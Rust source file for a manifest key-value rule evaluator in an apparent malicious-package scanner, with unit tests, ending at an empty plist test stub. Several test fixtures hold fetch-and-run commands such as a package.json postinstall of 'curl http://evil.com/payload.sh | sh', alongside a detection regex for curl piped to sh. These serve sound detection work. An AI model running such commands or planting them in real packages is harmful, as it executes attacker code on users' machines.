//! Key-Value condition evaluator for structured manifest files.
//!
//! Supports querying JSON, YAML, and TOML manifests using path expressions.
//!
//! # Path Syntax
//! - `key` - Access object key
//! - `a.b.c` - Nested access
//! - `[0]` - Array index
//! - `[*]` - All array elements (wildcard)
//!
//! # Examples
//! ```yaml
//! # Check if permissions array contains "debugger"
//! type: kv
//! path: "permissions"
//! exact: "debugger"
//!
//! # Check if any content script targets all URLs
//! type: kv
//! path: "content_scripts[*].matches"
//! exact: "<all_urls>"
//!
//! # Check if postinstall script contains curl
//! type: kv
//! path: "scripts.postinstall"
//! substr: "curl"
//! ```

use crate::composite_rules::condition::Condition;
use crate::types::Evidence;
use regex::Regex;
use serde_json::Value;
use std::path::Path;

/// Detected format of the structured data file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StructuredFormat {
    Json,
    Yaml,
    Toml,
    /// Apple Property List (XML or Binary)
    Plist,
    /// Python PKG-INFO / METADATA (RFC 822 format)
    PkgInfo,
    Unknown,
}

/// A segment in a parsed path expression.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PathSegment {
    /// Object key access: `"permissions"` or `"scripts"`
    Key(String),
    /// Array index access: `[0]`, `[1]`
    Index(usize),
    /// Wildcard array access: `[*]` - matches all elements
    Wildcard,
}

/// Matcher for comparing values at a path.
#[derive(Debug, Default)]
pub struct KvMatcher {
    pub exact: Option<String>,
    pub substr: Option<String>,
    pub regex: Option<Regex>,
    pub case_insensitive: bool,
}

impl KvMatcher {
    /// Create a new matcher from condition parameters.
    pub fn new(
        exact: Option<&String>,
        substr: Option<&String>,
        regex: Option<&Regex>,
        case_insensitive: bool,
    ) -> Self {
        Self {
            exact: exact.cloned(),
            substr: substr.cloned(),
            regex: regex.cloned(),
            case_insensitive,
        }
    }

    /// Check if a value matches this matcher.
    ///
    /// For arrays, returns true if any element matches.
    /// For scalars, checks the value directly.
    /// If no matcher is specified (existence check), returns true.
    pub fn matches(&self, value: &Value) -> bool {
        // If no matcher specified, just check existence (path resolved)
        if self.exact.is_none() && self.substr.is_none() && self.regex.is_none() {
            return true;
        }

        match value {
            Value::Array(arr) => {
                // For arrays, check if any element matches
                arr.iter().any(|v| self.scalar_matches(v))
            }
            _ => self.scalar_matches(value),
        }
    }

    /// Check if a scalar value matches the matcher.
    fn scalar_matches(&self, value: &Value) -> bool {
        let s = value_to_string(value);

        if let Some(ref exact_val) = self.exact {
            return if self.case_insensitive {
                s.eq_ignore_ascii_case(exact_val)
            } else {
                s == *exact_val
            };
        }

        if let Some(ref substr_val) = self.substr {
            return if self.case_insensitive {
                s.to_lowercase().contains(&substr_val.to_lowercase())
            } else {
                s.contains(substr_val.as_str())
            };
        }

        if let Some(ref re) = self.regex {
            return re.is_match(&s);
        }

        false
    }
}

/// Convert a JSON value to a string for matching.
fn value_to_string(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        Value::Null => "null".to_string(),
        // For arrays and objects, serialize to JSON string
        _ => value.to_string(),
    }
}

/// Detect the format of a structured data file.
///
/// Only recognizes known manifest filenames to avoid processing arbitrary structured data files.
/// This ensures we only parse files we have explicit support for.
pub fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
    let path_str = path.to_string_lossy().to_lowercase();

    // Check filename patterns for known manifests
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        let name_lower = name.to_lowercase();

        // Known JSON manifests
        if name_lower == "package.json"
            || name_lower == "manifest.json"
            || name_lower == "composer.json"
        {
            return StructuredFormat::Json;
        }

        // Known TOML manifests
        if name_lower == "cargo.toml" || name_lower == "pyproject.toml" {
            return StructuredFormat::Toml;
        }

        // Known YAML files - GitHub Actions workflows
        if (path_str.contains(".github/workflows/") || path_str.contains(".github\\workflows\\"))
            && (name_lower.ends_with(".yml") || name_lower.ends_with(".yaml"))
        {
            return StructuredFormat::Yaml;
        }

        // Python package metadata files (RFC 822 format)
        if name_lower == "pkg-info" || name_lower == "metadata" {
            return StructuredFormat::PkgInfo;
        }

        // Plist files - check by extension since they're commonly used in macOS apps
        if name_lower.ends_with(".plist") {
            return StructuredFormat::Plist;
        }
    }

    // Limited content sniffing for special cases only
    // We don't detect random JSON/YAML/TOML files - only process known filenames
    let content_str = String::from_utf8_lossy(content);
    let trimmed = content_str.trim_start();

    // Check for PKG-INFO/METADATA format (RFC 822 headers)
    // These files start with "Metadata-Version:" header
    if trimmed.starts_with("Metadata-Version:") {
        return StructuredFormat::PkgInfo;
    }

    // Check for Binary Plist
    if content.starts_with(b"bplist") {
        return StructuredFormat::Plist;
    }

    // Check for XML Plist
    if trimmed.starts_with("<?xml")
        && (trimmed.contains("<plist") || trimmed.contains("<!DOCTYPE plist"))
    {
        return StructuredFormat::Plist;
    }
    if trimmed.starts_with("<plist") {
        return StructuredFormat::Plist;
    }

    // No other content sniffing - only process known filenames
    StructuredFormat::Unknown
}

/// Parse a path string into segments.
///
/// # Examples
/// - `"permissions"` -> `[Key("permissions")]`
/// - `"scripts.postinstall"` -> `[Key("scripts"), Key("postinstall")]`
/// - `"content_scripts[*].matches"` -> `[Key("content_scripts"), Wildcard, Key("matches")]`
/// - `"items[0]"` -> `[Key("items"), Index(0)]`
pub fn parse_path(path: &str) -> Result<Vec<PathSegment>, String> {
    let mut segments = Vec::new();
    let mut current_key = String::new();
    let mut chars = path.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '.' => {
                if !current_key.is_empty() {
                    segments.push(PathSegment::Key(current_key.clone()));
                    current_key.clear();
                }
            }
            '[' => {
                if !current_key.is_empty() {
                    segments.push(PathSegment::Key(current_key.clone()));
                    current_key.clear();
                }

                // Parse index or wildcard
                let mut index_str = String::new();
                while let Some(&next_c) = chars.peek() {
                    if next_c == ']' {
                        chars.next();
                        break;
                    }
                    index_str.push(chars.next().unwrap());
                }

                if index_str == "*" {
                    segments.push(PathSegment::Wildcard);
                } else if let Ok(idx) = index_str.parse::<usize>() {
                    segments.push(PathSegment::Index(idx));
                } else {
                    return Err(format!("invalid array index: [{}]", index_str));
                }
            }
            _ => {
                current_key.push(c);
            }
        }
    }

    if !current_key.is_empty() {
        segments.push(PathSegment::Key(current_key));
    }

    if segments.is_empty() {
        return Err("empty path".to_string());
    }

    Ok(segments)
}

/// Navigate to a path in a JSON value and return all matching values.
///
/// Wildcards expand to multiple values.
pub fn navigate<'a>(value: &'a Value, segments: &[PathSegment]) -> Vec<&'a Value> {
    if segments.is_empty() {
        return vec![value];
    }

    let segment = &segments[0];
    let remaining = &segments[1..];

    match segment {
        PathSegment::Key(key) => {
            if let Value::Object(obj) = value {
                if let Some(v) = obj.get(key) {
                    return navigate(v, remaining);
                }
            }
            Vec::new()
        }
        PathSegment::Index(idx) => {
            if let Value::Array(arr) = value {
                if let Some(v) = arr.get(*idx) {
                    return navigate(v, remaining);
                }
            }
            Vec::new()
        }
        PathSegment::Wildcard => {
            if let Value::Array(arr) = value {
                let mut results = Vec::new();
                for item in arr {
                    results.extend(navigate(item, remaining));
                }
                return results;
            }
            Vec::new()
        }
    }
}

/// Parse PKG-INFO/METADATA format (RFC 822) into a JSON Value.
///
/// Format is simple key-value headers:
/// ```text
/// Metadata-Version: 2.1
/// Name: my-package
/// Version: 1.0.0
/// Summary: A package description
/// Author: Someone <someone@example.com>
/// ```
///
/// Multi-line values use continuation lines (starting with whitespace).
/// Multiple values for the same key become arrays.
fn parse_pkginfo(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut map: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_key: Option<String> = None;
    let mut current_value = String::new();

    for line in text.lines() {
        if line.starts_with(' ') || line.starts_with('\t') {
            // Continuation line - append to current value
            if current_key.is_some() {
                current_value.push('\n');
                current_value.push_str(line.trim());
            }
        } else if let Some(colon_pos) = line.find(':') {
            // New header - save previous if any
            if let Some(key) = current_key.take() {
                insert_pkginfo_value(&mut map, key, current_value.trim().to_string());
            }

            let key = line[..colon_pos].trim().to_string();
            let value = line[colon_pos + 1..].trim().to_string();
            current_key = Some(key);
            current_value = value;
        }
    }

    // Don't forget the last header
    if let Some(key) = current_key {
        insert_pkginfo_value(&mut map, key, current_value.trim().to_string());
    }

    Some(Value::Object(map))
}

/// Insert a value into PKG-INFO map, handling multiple values for same key.
fn insert_pkginfo_value(map: &mut serde_json::Map<String, Value>, key: String, value: String) {
    if value.is_empty() {
        return;
    }

    // Normalize key to lowercase with hyphens (like HTTP headers)
    let normalized_key = key.to_lowercase();

    if let Some(existing) = map.get_mut(&normalized_key) {
        // Key already exists - convert to array or append
        match existing {
            Value::Array(arr) => {
                arr.push(Value::String(value));
            }
            Value::String(s) => {
                let old = s.clone();
                *existing = Value::Array(vec![Value::String(old), Value::String(value)]);
            }
            _ => {}
        }
    } else {
        map.insert(normalized_key, Value::String(value));
    }
}

/// Evaluate a kv condition against file content.
///
/// Returns Some(Evidence) if the condition matches, None otherwise.
pub fn evaluate_kv(condition: &Condition, content: &[u8], file_path: &Path) -> Option<Evidence> {
    let Condition::Kv {
        path,
        exact,
        substr,
        regex: _,
        case_insensitive,
        compiled_regex,
    } = condition
    else {
        return None;
    };

    // Detect format and parse
    let format = detect_format(file_path, content);
    let parsed: Value = match format {
        StructuredFormat::Json => serde_json::from_slice(content).ok()?,
        StructuredFormat::Yaml => serde_yaml::from_slice(content).ok()?,
        StructuredFormat::Toml => {
            let s = std::str::from_utf8(content).ok()?;
            toml::from_str(s).ok()?
        }
        StructuredFormat::Plist => plist::from_bytes(content).ok()?,
        StructuredFormat::PkgInfo => parse_pkginfo(content)?,
        StructuredFormat::Unknown => {
            // Try JSON first, then YAML
            if let Ok(v) = serde_json::from_slice(content) {
                v
            } else {
                serde_yaml::from_slice(content).ok()?
            }
        }
    };

    // Navigate path
    let segments = parse_path(path).ok()?;
    let values = navigate(&parsed, &segments);

    if values.is_empty() {
        return None; // Path not found
    }

    // Build matcher
    let matcher = KvMatcher::new(
        exact.as_ref(),
        substr.as_ref(),
        compiled_regex.as_ref(),
        *case_insensitive,
    );

    // Check if any value matches
    for value in &values {
        if matcher.matches(value) {
            let matched_value = format_evidence_value(value);
            return Some(Evidence {
                method: "kv".to_string(),
                source: file_path.display().to_string(),
                value: matched_value,
                location: Some(path.clone()),
            });
        }
    }

    None
}

/// Format a value for evidence display (truncated if necessary).
fn format_evidence_value(value: &Value) -> String {
    let s = match value {
        Value::String(s) => s.clone(),
        Value::Array(arr) => {
            // Format array elements
            let items: Vec<String> = arr.iter().map(value_to_string).collect();
            format!("[{}]", items.join(", "))
        }
        _ => value_to_string(value),
    };

    // Truncate if too long
    if s.len() > 200 {
        format!("{}...", &s[..197])
    } else {
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // ==========================================================================
    // Path Parsing Tests
    // ==========================================================================

    #[test]
    fn test_path_simple_key() {
        assert_eq!(
            parse_path("permissions").unwrap(),
            vec![PathSegment::Key("permissions".to_string())]
        );
    }

    #[test]
    fn test_path_nested() {
        assert_eq!(
            parse_path("scripts.postinstall").unwrap(),
            vec![
                PathSegment::Key("scripts".to_string()),
                PathSegment::Key("postinstall".to_string())
            ]
        );
    }

    #[test]
    fn test_path_array_index() {
        assert_eq!(
            parse_path("content_scripts[0].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Index(0),
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_wildcard() {
        assert_eq!(
            parse_path("content_scripts[*].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_deep_nesting() {
        assert_eq!(
            parse_path("a.b.c.d.e").unwrap(),
            vec![
                PathSegment::Key("a".to_string()),
                PathSegment::Key("b".to_string()),
                PathSegment::Key("c".to_string()),
                PathSegment::Key("d".to_string()),
                PathSegment::Key("e".to_string())
            ]
        );
    }

    #[test]
    fn test_path_multiple_wildcards() {
        assert_eq!(
            parse_path("content_scripts[*].matches[*]").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string()),
                PathSegment::Wildcard
            ]
        );
    }

    #[test]
    fn test_path_key_with_hyphen() {
        assert_eq!(
            parse_path("dev-dependencies.serde").unwrap(),
            vec![
                PathSegment::Key("dev-dependencies".to_string()),
                PathSegment::Key("serde".to_string())
            ]
        );
    }

    #[test]
    fn test_path_empty() {
        assert!(parse_path("").is_err());
    }

    // ==========================================================================
    // Navigation Tests
    // ==========================================================================

    #[test]
    fn test_navigate_simple() {
        let json = json!({"permissions": ["a", "b"]});
        let segments = parse_path("permissions").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!(["a", "b"])]);
    }

    #[test]
    fn test_navigate_nested() {
        let json = json!({"scripts": {"postinstall": "npm build"}});
        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("npm build")]);
    }

    #[test]
    fn test_navigate_missing_key() {
        let json = json!({"scripts": {}});
        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_expands() {
        let json = json!({
            "items": [
                {"name": "a"},
                {"name": "b"},
                {"name": "c"}
            ]
        });
        let segments = parse_path("items[*].name").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("a"), &json!("b"), &json!("c")]);
    }

    #[test]
    fn test_navigate_index() {
        let json = json!({"items": ["a", "b", "c"]});
        let segments = parse_path("items[1]").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("b")]);
    }

    #[test]
    fn test_navigate_index_out_of_bounds() {
        let json = json!({"items": ["a", "b"]});
        let segments = parse_path("items[5]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_on_non_array() {
        let json = json!({"items": "not an array"});
        let segments = parse_path("items[*]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    // ==========================================================================
    // Matcher Tests
    // ==========================================================================

    #[test]
    fn test_exact_in_array() {
        let matcher = KvMatcher {
            exact: Some("debugger".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["storage", "debugger", "tabs"])));
        assert!(!matcher.matches(&json!(["storage", "tabs"])));
    }

    #[test]
    fn test_exact_scalar() {
        let matcher = KvMatcher {
            exact: Some("document_start".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("document_start")));
        assert!(!matcher.matches(&json!("document_end")));
        assert!(!matcher.matches(&json!("document_start_extra")));
    }

    #[test]
    fn test_substr_scalar() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("wget http://evil.com")));
    }

    #[test]
    fn test_substr_in_array() {
        let matcher = KvMatcher {
            substr: Some("amazon".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*", "*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_regex_match() {
        let re = Regex::new(r"curl.*\|.*sh").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("curl http://evil.com")));
    }

    #[test]
    fn test_regex_in_array() {
        let re = Regex::new(r"amazon|ebay").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*"])));
        assert!(matcher.matches(&json!(["*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_case_insensitive_exact() {
        let matcher = KvMatcher {
            exact: Some("DEBUGGER".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("debugger")));
        assert!(matcher.matches(&json!("DEBUGGER")));
        assert!(matcher.matches(&json!("Debugger")));
    }

    #[test]
    fn test_case_insensitive_substr() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("CURL http://evil.com")));
        assert!(matcher.matches(&json!("Curl http://evil.com")));
    }

    #[test]
    fn test_existence_only() {
        let matcher = KvMatcher::default();
        assert!(matcher.matches(&json!("anything")));
        assert!(matcher.matches(&json!(null)));
        assert!(matcher.matches(&json!([])));
    }

    #[test]
    fn test_number_matching() {
        let matcher = KvMatcher {
            exact: Some("2".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(2)));
        assert!(matcher.matches(&json!("2")));
        assert!(!matcher.matches(&json!(3)));
    }

    #[test]
    fn test_boolean_matching() {
        let matcher = KvMatcher {
            exact: Some("true".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(true)));
        assert!(!matcher.matches(&json!(false)));
    }

    // ==========================================================================
    // Format Detection Tests
    // ==========================================================================

    #[test]
    fn test_detect_known_json_manifests() {
        // Only known JSON manifest filenames are detected
        assert_eq!(
            detect_format(Path::new("manifest.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("package.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("composer.json"), b""),
            StructuredFormat::Json
        );
    }

    #[test]
    fn test_detect_github_actions_workflow() {
        // GitHub Actions workflows in .github/workflows/ are detected
        assert_eq!(
            detect_format(Path::new(".github/workflows/ci.yaml"), b""),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new(".github/workflows/test.yml"), b""),
            StructuredFormat::Yaml
        );
    }

    #[test]
    fn test_detect_known_toml_manifests() {
        // Known TOML manifests are detected
        assert_eq!(
            detect_format(Path::new("Cargo.toml"), b""),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("pyproject.toml"), b""),
            StructuredFormat::Toml
        );
    }

    #[test]
    fn test_no_detection_for_unknown_json() {
        // Random JSON files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), br#"{"key": "value"}"#),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("random.json"), b"[1, 2, 3]"),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_yaml() {
        // Random YAML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"key: value\nother: 123"),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.yaml"), b"key: value"),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_toml() {
        // Random TOML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"[package]\nname = \"foo\""),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.toml"), b"key = \"value\""),
            StructuredFormat::Unknown
        );
    }

    // ==========================================================================
    // Integration Tests
    // ==========================================================================

    #[test]
    fn test_chrome_manifest_permissions() {
        let manifest = br#"{
            "manifest_version": 3,
            "name": "Test Extension",
            "permissions": ["storage", "debugger", "tabs"],
            "host_permissions": ["<all_urls>"]
        }"#;

        let path = Path::new("manifest.json");

        // Test exact match in array
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_some());

        // Test non-matching exact
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("cookies".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_none());

        // Test manifest_version
        let cond = Condition::Kv {
            path: "manifest_version".to_string(),
            exact: Some("3".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_chrome_manifest_content_scripts() {
        let manifest = br#"{
            "content_scripts": [
                {
                    "matches": ["<all_urls>"],
                    "js": ["content.js"],
                    "run_at": "document_start"
                },
                {
                    "matches": ["*://*.amazon.com/*"],
                    "js": ["shopping.js"]
                }
            ]
        }"#;

        let path = Path::new("manifest.json");

        // Test wildcard path with exact match
        let cond = Condition::Kv {
            path: "content_scripts[*].matches".to_string(),
            exact: Some("<all_urls>".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_some());

        // Test wildcard path with substr
        let cond = Condition::Kv {
            path: "content_scripts[*].matches".to_string(),
            exact: None,
            substr: Some("amazon".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_some());

        // Test run_at
        let cond = Condition::Kv {
            path: "content_scripts[*].run_at".to_string(),
            exact: Some("document_start".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_npm_package_json() {
        let package = br#"{
            "name": "malicious-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload.sh | sh",
                "test": "jest"
            },
            "dependencies": {
                "lodash": "^4.17.21"
            }
        }"#;

        let path = Path::new("package.json");

        // Test existence check
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, package, path).is_some());

        // Test substr
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: Some("curl".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, package, path).is_some());

        // Test regex
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: Some(Regex::new(r"curl.*\|.*sh").unwrap()),
        };
        assert!(evaluate_kv(&cond, package, path).is_some());

        // Test non-existent key
        let cond = Condition::Kv {
            path: "scripts.preinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, package, path).is_none());
    }

    #[test]
    fn test_yaml_format() {
        let yaml = b"permissions:
  - storage
  - debugger
  - tabs
name: test
";

        let path = Path::new("config.yaml");

        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, yaml, path).is_some());
    }

    #[test]
    fn test_toml_format() {
        let toml = br#"
[package]
name = "my-crate"
version = "0.1.0"

[dependencies]
serde = "1.0"
openssl = "0.10"
"#;

        let path = Path::new("Cargo.toml");

        // Test existence
        let cond = Condition::Kv {
            path: "dependencies.openssl".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, toml, path).is_some());

        // Test non-existent
        let cond = Condition::Kv {
            path: "dependencies.tokio".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, toml, path).is_none());

        // Test exact value
        let cond = Condition::Kv {
            path: "package.name".to_string(),
            exact: Some("my-crate".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, toml, path).is_some());
    }

    // ==========================================================================
    // Edge Case Tests
    // ==========================================================================

    #[test]
    fn test_empty_array() {
        let json = br#"{"permissions": []}"#;
        let path = Path::new("test.json");

        // Empty array exists
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_some());

        // But contains nothing
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("anything".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_none());
    }

    #[test]
    fn test_null_value() {
        let json = br#"{"value": null}"#;
        let path = Path::new("test.json");

        // Path exists
        let cond = Condition::Kv {
            path: "value".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_some());

        // exact: "null" matches
        let cond = Condition::Kv {
            path: "value".to_string(),
            exact: Some("null".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_some());
    }

    #[test]
    fn test_deeply_nested() {
        let json = br#"{"a": {"b": {"c": {"d": {"e": "found"}}}}}"#;
        let path = Path::new("test.json");

        let cond = Condition::Kv {
            path: "a.b.c.d.e".to_string(),
            exact: Some("found".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_some());
    }

    #[test]
    fn test_unicode() {
        let json = r#"{"name": "日本語パッケージ"}"#.as_bytes();
        let path = Path::new("test.json");

        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: None,
            substr: Some("日本語".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, json, path).is_some());
    }

    #[test]
    fn test_malformed_json() {
        let bad = br#"{"broken": }"#;
        let path = Path::new("test.json");

        let cond = Condition::Kv {
            path: "broken".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        // Should not panic, just return no match
        assert!(evaluate_kv(&cond, bad, path).is_none());
    }

    // ==========================================================================
    // PKG-INFO Format Tests
    // ==========================================================================

    #[test]
    fn test_detect_pkginfo_by_filename() {
        assert_eq!(
            detect_format(Path::new("PKG-INFO"), b""),
            StructuredFormat::PkgInfo
        );
        assert_eq!(
            detect_format(Path::new("METADATA"), b""),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_detect_pkginfo_by_content() {
        let content = b"Metadata-Version: 2.1\nName: my-package\n";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_pkginfo_simple() {
        let pkginfo = b"Metadata-Version: 2.1
Name: malicious-package
Version: 1.0.0
Summary: A suspicious package
Author: attacker@evil.com
";

        let path = Path::new("PKG-INFO");

        // Test name match
        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: Some("malicious-package".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());

        // Test version
        let cond = Condition::Kv {
            path: "version".to_string(),
            exact: Some("1.0.0".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());

        // Test author contains suspicious domain
        let cond = Condition::Kv {
            path: "author".to_string(),
            exact: None,
            substr: Some("evil.com".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());

        // Test existence
        let cond = Condition::Kv {
            path: "summary".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());

        // Test non-existent
        let cond = Condition::Kv {
            path: "license".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_none());
    }

    #[test]
    fn test_pkginfo_multiple_classifiers() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Classifier: Development Status :: 3 - Alpha
Classifier: License :: OSI Approved :: MIT License
Classifier: Programming Language :: Python :: 3
";

        let path = Path::new("PKG-INFO");

        // Multiple Classifier values become an array
        let cond = Condition::Kv {
            path: "classifier".to_string(),
            exact: None,
            substr: Some("MIT License".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());

        // Check Python classifier
        let cond = Condition::Kv {
            path: "classifier".to_string(),
            exact: None,
            substr: Some("Python".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_multiline_description() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Description: This is a package
        with a multi-line
        description.
Version: 1.0.0
";

        let path = Path::new("PKG-INFO");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: Some("multi-line".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_case_insensitive_keys() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Author-Email: test@example.com
";

        let path = Path::new("PKG-INFO");

        // Keys are normalized to lowercase
        let cond = Condition::Kv {
            path: "author-email".to_string(),
            exact: None,
            substr: Some("example.com".to_string()),
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, pkginfo, path).is_some());
    }

    // ==========================================================================
    // Plist Format Tests
    // ==========================================================================

    #[test]
